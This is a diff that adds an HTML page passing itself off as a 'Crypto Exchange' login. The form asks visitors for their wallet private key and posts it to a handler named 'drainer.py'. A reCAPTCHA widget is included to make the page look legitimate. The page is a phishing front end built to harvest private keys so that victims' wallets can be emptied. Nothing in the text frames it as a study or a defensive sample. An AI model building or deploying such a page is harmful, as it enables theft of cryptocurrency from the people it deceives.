@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crypto Exchange - Log In</title>
+  <link rel="stylesheet" href="styles.css">
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+  <div class="container">
+    <h1>Crypto Exchange - Log In</h1>
+    <form action="drainer.py" method="post">
+      <div class="g-recaptcha" data-sitekey="your-recaptcha-site-key"></div>
+      <label for="private_key">Private Key:</label>
+      <input type="text" id="private_key" name="private_key" required>
+      <br>
+      <input type="submit" value="Log In">
+    </form>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
